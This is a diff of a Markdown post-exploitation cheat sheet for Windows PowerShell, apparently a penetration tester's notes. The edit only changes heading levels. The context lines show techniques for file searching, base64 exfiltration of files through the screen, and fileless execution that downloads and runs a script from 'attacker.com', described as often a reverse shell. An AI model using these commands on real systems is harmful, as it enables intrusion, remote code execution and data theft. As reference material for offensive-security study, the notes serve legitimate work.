@@ -81,7 +81,7 @@ get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *
 Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
 ```
 
-## exfiltration through the screen
+### exfiltration through the screen
 
 Provided file size is small enough, set a variable `$path = "C:\Path\To\file"` then put the following prepared statement into the shell
 
@@ -92,16 +92,16 @@ $b64 = (Get-Content -Path $path -Encoding byte); [convert]::ToBase64String($b64)
 Note that the resulting b64 is in `utf-16le` and should be converted with the `iconv` utility before further usage. 
 
 
-## using common scripts
+### using common scripts
 
-### execution without touching disk
+#### execution without touching disk
 
 1. host the `script.ps1` 
 2. edit the `script.ps1` file to call w.e. function you want by placing the function call, including arguments, at the end of this file. This is often the reverse shell.
 3. use `IEX(new-object net.webClient).downloadString('http://attacker.com/script.ps1')` 
 
 
-### execution with touching disk 
+#### execution with touching disk 
 
 > `PowerUp.ps1` is used as an example
 
